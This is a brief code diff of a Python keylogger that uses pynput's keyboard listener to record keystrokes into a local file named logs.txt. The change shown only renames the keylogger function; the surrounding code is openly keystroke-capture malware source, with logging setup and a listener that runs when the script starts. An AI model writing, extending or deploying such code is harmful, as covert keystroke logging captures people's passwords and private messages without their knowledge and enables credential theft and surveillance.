@@ -2,7 +2,7 @@ import logging
 from pynput.keyboard import Listener
 
 
-def keylogger_pynput():
+def keylogger_py():
     log_destination = ""
     logging.basicConfig(filename=(log_destination + "logs.txt"),
                         level=logging.DEBUG,
@@ -15,4 +15,4 @@ def keylogger_pynput():
         listener.join()
 
 
-keylogger_pynput()
+keylogger_py()
